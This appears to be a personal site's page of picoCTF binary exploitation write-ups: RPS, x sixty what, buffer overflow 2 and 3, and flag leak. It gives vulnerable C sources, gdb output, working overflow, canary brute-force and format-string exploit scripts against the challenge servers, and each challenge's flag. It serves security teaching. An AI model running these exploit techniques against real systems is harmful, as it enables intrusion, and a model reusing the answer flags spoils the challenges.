### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---
	
## RPS

- Author: Will Hong
- 200 Points

### Description

Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row. Connect to the program with netcat: 
	
~~~shell
$ nc saturn.picoctf.net 51420
~~~

The program's source code with the flag redacted can be downloaded [here](https://artifacts.picoctf.net/c/442/game-redacted.c).

### Hints

1. How does the program check if you won?

### Attachments

1. [game-redacted.c](https://artifacts.picoctf.net/c/442/game-redacted.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Reviewing the source code we can see the program is a rock-paper-scissors game:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");
  
  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
      
    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
~~~

The program checks if the user has entered a winning guess by looking for a winning string in the user input:

~~~c
  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
~~~
	
This returns true is the winning string is found in the user input.  We can simply enter all inputs ("rockpaperscissors") to "win" each round:

~~~shell
$ nc saturn.picoctf.net 51420
Welcome challenger to the game of Rock, Paper, Scissors
For anyone that beats me 5 times in a row, I will offer up a flag I found
Are you ready?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: rock
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: scissors
You win! Play again?
Type '1' to play a game
Type '2' to exit the program
1
1


Please make your selection (rock/paper/scissors):
rockpaperscissors
rockpaperscissors
You played: rockpaperscissors
The computer played: paper
You win! Play again?
Congrats, here's the flag!
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
Type '1' to play a game
Type '2' to exit the program
2
2
exit
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## x sixty what

- Author: Sanjay C / LT 'syreal' Jones
- 200 Points

### Description

Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this [program](https://artifacts.picoctf.net/c/192/vuln). [Download source](https://artifacts.picoctf.net/c/192/vuln.c).

~~~
nc saturn.picoctf.net 55327
~~~

### Hints

1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2. Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/192/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/192/vuln.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can run the program and overflow the buffer to get a segmentation fault:

~~~shell
$ ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
~~~

Reviewing the source code, we can see the user input is a buffer of length 64 Bytes:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
~~~

We can overflow this buffer with 65 characters:

~~~shell
$ python -c "print('a'*65)" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Segmentation fault (core dumped)
~~~

Using gdb, we can see the user input at 0x04012ca:

~~~shell
$ gdb vuln
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:	endbr64 
   0x00000000004012b6 <+4>:	push   %rbp
   0x00000000004012b7 <+5>:	mov    %rsp,%rbp
   0x00000000004012ba <+8>:	sub    $0x40,%rsp
   0x00000000004012be <+12>:	lea    -0x40(%rbp),%rax
   0x00000000004012c2 <+16>:	mov    %rax,%rdi
   0x00000000004012c5 <+19>:	mov    $0x0,%eax
   0x00000000004012ca <+24>:	callq  0x401100 <gets@plt>
   0x00000000004012cf <+29>:	nop
   0x00000000004012d0 <+30>:	leaveq 
   0x00000000004012d1 <+31>:	retq   
End of assembler dump.
~~~

We can overwrite the RBP register with a string of 64 + 8 + Payload(8) Bytes. 

As per the hint, we need to jump to the second function in the flag routine, we can disassemble flag:

~~~shell
(gdb) disass flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:	endbr64 
   0x000000000040123a <+4>:	push   %rbp
   0x000000000040123b <+5>:	mov    %rsp,%rbp
   0x000000000040123e <+8>:	sub    $0x50,%rsp
   0x0000000000401242 <+12>:	lea    0xdbf(%rip),%rsi        # 0x402008
   0x0000000000401249 <+19>:	lea    0xdba(%rip),%rdi        # 0x40200a
   0x0000000000401250 <+26>:	callq  0x401130 <fopen@plt>
   0x0000000000401255 <+31>:	mov    %rax,-0x8(%rbp)
   0x0000000000401259 <+35>:	cmpq   $0x0,-0x8(%rbp)
   0x000000000040125e <+40>:	jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:	lea    0xdac(%rip),%rdx        # 0x402013
   0x0000000000401267 <+49>:	lea    0xdba(%rip),%rsi        # 0x402028
   0x000000000040126e <+56>:	lea    0xde8(%rip),%rdi        # 0x40205d
   0x0000000000401275 <+63>:	mov    $0x0,%eax
   0x000000000040127a <+68>:	callq  0x4010e0 <printf@plt>
   0x000000000040127f <+73>:	mov    $0x0,%edi
   0x0000000000401284 <+78>:	callq  0x401140 <exit@plt>
   0x0000000000401289 <+83>:	mov    -0x8(%rbp),%rdx
   0x000000000040128d <+87>:	lea    -0x50(%rbp),%rax
   0x0000000000401291 <+91>:	mov    $0x40,%esi
   0x0000000000401296 <+96>:	mov    %rax,%rdi
   0x0000000000401299 <+99>:	callq  0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:	lea    -0x50(%rbp),%rax
   0x00000000004012a2 <+108>:	mov    %rax,%rdi
   0x00000000004012a5 <+111>:	mov    $0x0,%eax
   0x00000000004012aa <+116>:	callq  0x4010e0 <printf@plt>
--Type <RET> for more, q to quit, c to continue without paging--c
   0x00000000004012af <+121>:	nop
   0x00000000004012b0 <+122>:	leaveq 
   0x00000000004012b1 <+123>:	retq   
~~~

This is the "mov" function at address 0x40123b.  The payload can be tested using Python:

~~~shell
$ python -c "print('a'*72+'\x3b\x12\x40\x00\x00\x00\x00\x00')" | ./vuln
Welcome to 64-bit. Give me a string that gets you the flag: 
Please create 'flag.txt' in this directory with your own debugging flag.
~~~

In python, we can pass this payload to the server:

~~~py
import socket
import binascii
import time

URL = "saturn.picoctf.net"
PORT = 55327

sock = socket.socket()
sock.connect((URL,PORT))

data = sock.recv(1024).decode()
print(data)

a = binascii.unhexlify(hex(0x3b)[2:])
b = binascii.unhexlify(hex(0x12)[2:])
c = binascii.unhexlify(hex(0x40)[2:])
d = binascii.unhexlify("0"+hex(0x00)[2:])

InputString = ("a"*72).encode()+a+b+c+d*5+"\n".encode()
print(InputString)
sock.send(InputString)
time.sleep(1)
data = sock.recv(1024).decode()
print(data)

sock.close()
~~~

This returns the flag:

~~~
Welcome to 64-bit. Give me a string that gets you the flag: 

b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x12@\x00\x00\x00\x00\x00\n'
picoCTF{b1663r_15_b3773r_11c407bc}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{b1663r_15_b3773r_11c407bc}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## buffer overflow 2

- Author: Sanjay C / Palash Oswal
- 300 Points

### Description

Control the return address and arguments This time you'll need to control the arguments to the function you return to! Can you get the flag from this [program](https://artifacts.picoctf.net/c/344/vuln)? 
You can view source [here](https://artifacts.picoctf.net/c/344/vuln.c). And connect with it using:

~~~
nc saturn.picoctf.net 65313
~~~

### Hints

1. Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes.
2. Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/344/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/344/vuln.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can test the program to verify the user input buffer can be overwritten:

~~~shell
$ ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
~~~

Reviewing the source code, we can see the buffer is set to 100 Bytes. We can also see the function "win" that we need to point to:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
~~~

We can see the segmentation fault occurs with 108 characters:

~~~shell
$ python -c "print('a'*108)" | ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
~~~

Using gdb we can find the address of the win function:

~~~shell
(gdb) info addr win
Symbol "win" is at 0x8049296 in a file compiled without debugging.
~~~

With a buffer of 112 Bytes, we can call the win function:

~~~shell
$ python -c "print('a'*112+'\x96\x92\x04\x08')" | ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
Please create 'flag.txt' in this directory with your own debugging flag.
~~~

Creating the flag.txt file with string "test", we re-run and get a segmentation fault:

~~~shell
$ python -c "print('a'*112+'\x96\x92\x04\x08')" | ./vuln
Please enter your string: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
Segmentation fault (core dumped)
~~~

The function requires additional inputs as detailed in the source code, with additional 4 Bytes padding, we can pass both arguments "0xCAFEF00D" and "0xF00DF00D" to retrieve the test string:

~~~shell
$ python -c "print('a'*112+'\x96\x92\x04\x08'+'bbbb'+'\x0d\xf0\xfe\xca'+'\x0d\xf0\x0d\xf0')" | ./vuln
Please enter your string: 
���aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�bbbb
test
Segmentation fault (core dumped)
~~~

In python, we can pass this payload to the executable hosted on the challenge server:

~~~py
import socket
import binascii
import time

URL = "saturn.picoctf.net"
PORT = 65313

sock = socket.socket()
sock.connect((URL,PORT))

data = sock.recv(1024).decode()
print(data)

a = binascii.unhexlify(hex(0x96)[2:])
b = binascii.unhexlify(hex(0x92)[2:])
c = binascii.unhexlify("0"+hex(0x04)[2:])
d = binascii.unhexlify("0"+hex(0x08)[2:])
e = binascii.unhexlify("0"+hex(0x0d)[2:])
f = binascii.unhexlify(hex(0xf0)[2:])
g = binascii.unhexlify(hex(0xfe)[2:])
h = binascii.unhexlify(hex(0xca)[2:])
i = binascii.unhexlify("0"+hex(0x0d)[2:])
j = binascii.unhexlify(hex(0xf0)[2:])
k = binascii.unhexlify("0"+hex(0x0d)[2:])
l = binascii.unhexlify(hex(0xf0)[2:])

InputString = ("a"*112).encode()+a+b+c+d+("b"*4).encode()+e+f+g+h+i+j+k+l+"\n".encode()
print(InputString)
sock.send(InputString)
time.sleep(1)
data = sock.recv(1024)
print(data)

sock.close()
~~~

This provides the response:

~~~
Please enter your string: 
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0\n'
b'\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x96\x92\x04\x08bbbb\r\xf0\xfe\xca\r\xf0\r\xf0\npicoCTF{argum3nt5_4_d4yZ_b3fd8f66}'
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---
	
## buffer overflow 3

- Author: Sanjay C / Palash Oswal
- 300 Points

### Description

Do you think you can bypass the protection and get the flag? 
It looks like Dr. Oswal added a stack canary to this [program](https://artifacts.picoctf.net/c/492/vuln) to protect against buffer overflows. You can view source [here](https://artifacts.picoctf.net/c/492/vuln.c). And connect with it using: 

~~~
nc saturn.picoctf.net 52744
~~~

### Hints

1. Maybe there's a smart way to brute-force the canary?

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/492/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/492/vuln.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can review the source code for the program:

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
~~~
		    
This shows the flag will be displayed in the subfunction win().  We can use gdb to find the address of this function:

~~~
(gdb) info addr win
Symbol "win" is at 0x8049336 in a file compiled without debugging.
(gdb) disass win
Dump of assembler code for function win:
   0x08049336 <+0>:	endbr32 
   0x0804933a <+4>:	push   %ebp
   0x0804933b <+5>:	mov    %esp,%ebp
   0x0804933d <+7>:	push   %ebx
   0x0804933e <+8>:	sub    $0x54,%esp
   0x08049341 <+11>:	call   0x8049270 <__x86.get_pc_thunk.bx>
   0x08049346 <+16>:	add    $0x2cba,%ebx
   0x0804934c <+22>:	sub    $0x8,%esp
   0x0804934f <+25>:	lea    -0x1ff8(%ebx),%eax
   0x08049355 <+31>:	push   %eax
   0x08049356 <+32>:	lea    -0x1ff6(%ebx),%eax
   0x0804935c <+38>:	push   %eax
   0x0804935d <+39>:	call   0x8049200 <fopen@plt>
   0x08049362 <+44>:	add    $0x10,%esp
   0x08049365 <+47>:	mov    %eax,-0xc(%ebp)
   0x08049368 <+50>:	cmpl   $0x0,-0xc(%ebp)
   0x0804936c <+54>:	jne    0x8049398 <win+98>
   0x0804936e <+56>:	sub    $0x4,%esp
   0x08049371 <+59>:	lea    -0x1fed(%ebx),%eax
   0x08049377 <+65>:	push   %eax
   0x08049378 <+66>:	lea    -0x1fd8(%ebx),%eax
   0x0804937e <+72>:	push   %eax
   0x0804937f <+73>:	lea    -0x1fa3(%ebx),%eax
   0x08049385 <+79>:	push   %eax
   0x08049386 <+80>:	call   0x8049140 <printf@plt>
   0x0804938b <+85>:	add    $0x10,%esp
--Type <RET> for more, q to quit, c to continue without paging--
   0x0804938e <+88>:	sub    $0xc,%esp
   0x08049391 <+91>:	push   $0x0
   0x08049393 <+93>:	call   0x80491c0 <exit@plt>
   0x08049398 <+98>:	sub    $0x4,%esp
   0x0804939b <+101>:	pushl  -0xc(%ebp)
   0x0804939e <+104>:	push   $0x40
   0x080493a0 <+106>:	lea    -0x4c(%ebp),%eax
   0x080493a3 <+109>:	push   %eax
   0x080493a4 <+110>:	call   0x8049160 <fgets@plt>
   0x080493a9 <+115>:	add    $0x10,%esp
   0x080493ac <+118>:	sub    $0xc,%esp
   0x080493af <+121>:	lea    -0x4c(%ebp),%eax
   0x080493b2 <+124>:	push   %eax
   0x080493b3 <+125>:	call   0x80491b0 <puts@plt>
   0x080493b8 <+130>:	add    $0x10,%esp
   0x080493bb <+133>:	mov    -0x4(%ebx),%eax
   0x080493c1 <+139>:	mov    (%eax),%eax
   0x080493c3 <+141>:	sub    $0xc,%esp
   0x080493c6 <+144>:	push   %eax
   0x080493c7 <+145>:	call   0x8049150 <fflush@plt>
   0x080493cc <+150>:	add    $0x10,%esp
   0x080493cf <+153>:	nop
   0x080493d0 <+154>:	mov    -0x4(%ebp),%ebx
   0x080493d3 <+157>:	leave  
   0x080493d4 <+158>:	ret    
End of assembler dump.
~~~

As before, we will use the second function in the win routine as our target address (0x0804933b).

In the source code, we can see the user inputs the number of Bytes to be input and the bytes themselves.  The buffer is fixed at 64 Bytes so is vulnerable to overflow.
	
We can see the canary file is used to kill the process in the event of an overflow exploit, to enable the exploit, we must identify the 4-Byte canary and include this in the payload.  We can generate a test canary.txt file with "TEST" as the canary.  We can show an incorrect payload will result in the premature exit of the program:

~~~shell
$ python -c "print('68\n' + b'a'*64+b'B'*4+'\n')" | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> ***** Stack Smashing Detected ***** : Canary Value Corrupt!
~~~

Whereas, if we append the correct canary value, we will get:

~~~shell
$ python -c "print('68\n' + b'a'*64+b'TEST'+'\n')" | ./vuln
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
~~~

We can write a python script to step through the canary input and identify the canary.txt string:

~~~py
import socket
import string
import time

URL = "saturn.picoctf.net"
PORT = 55001
DIC = string.printable
IN_STR = "a"*64
CAN_STR = ""

for i in range(4):
    N = 65+i
    nextletter = 0
    for j in DIC:
        end = 0
        wait = 0.1
        while end==0:
            sock = socket.socket()
            sock.connect((URL,PORT))
            data = sock.recv(1024).decode()
            time.sleep(wait)
            InputString = str(N) + "\n" + IN_STR + CAN_STR + j + "\n"
            InputString = InputString.encode()
            sock.send(InputString)
            time.sleep(wait)
            data = sock.recv(1024).decode()
            print(data)
            sock.close()
            if "Smashing" in data:
                print("Canary character {} is not \"{}\".".format(i+1,j))
                end = 1
                break
            elif "Flag" in data:
                CAN_STR += j
                print(CAN_STR)
                end = 1
                nextletter = 1
                break
            else:
                wait += 0.1
                print("wait time increased to {} seconds.".format(wait))
        if nextletter == 1:
            break
        
print(CAN_STR)
~~~

The canary is "BiRd".  Using this, we can expand the payload to call the win() function using a 16 Byte buffer before the address:

~~~py
import socket
import time
import binascii

URL = "saturn.picoctf.net"
PORT = 55001

SendStr = b"a"*64 + b"BiRd" + b"b"*16

hexa = binascii.unhexlify("3b".encode())
hexb = binascii.unhexlify("93".encode())
hexc = binascii.unhexlify("04".encode())
hexd = binascii.unhexlify("08".encode())

PtrStr = hexa+hexb+hexc+hexd

SendStr = SendStr + PtrStr
SendStr = str(len(SendStr)).encode() + b"\n" + SendStr

sock = socket.socket()
sock.connect((URL,PORT))
data = sock.recv(1024).decode()
time.sleep(1)
sock.send(SendStr)
time.sleep(1)
data = sock.recv(1024).decode()
print(data)

sock.close()
~~~

This returns the flag:

~~~
Input> Ok... Now Where's the Flag?
picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## flag leak

- Author: Neel Bhavsar
- 300 Points

### Description

Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/122/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/122/vuln.c). And connect with it using: 

~~~
nc saturn.picoctf.net 64147
~~~

### Hints

1. Format Strings

### Attachments

1. [vuln](https://artifacts.picoctf.net/c/122/vuln)
2. [vuln.c](https://artifacts.picoctf.net/c/122/vuln.c)
	
### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge can be brute forced by iteration using Python:

~~~py
import socket
import time

URL = "saturn.picoctf.net"
PORT = 64147

i = 0

while True:
    print("i = {}".format(i))
    sock = socket.socket()
    sock.connect((URL, PORT))
    data = sock.recv(1024)
    time.sleep(1)
    sock.send("%{}$s\n".format(i).encode())
    time.sleep(1)
    data = sock.recv(1024)
    sock.close()
    if b"CTF{" in data:
        print(data.decode())
        break
    else:
        i += 1
~~~

This returns the flag:

~~~
Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
~~~


</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
~~~

</details>

---

### [Binary Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

This page was last updated April 22.
	
## [djm89uk.github.io](https://djm89uk.github.io)
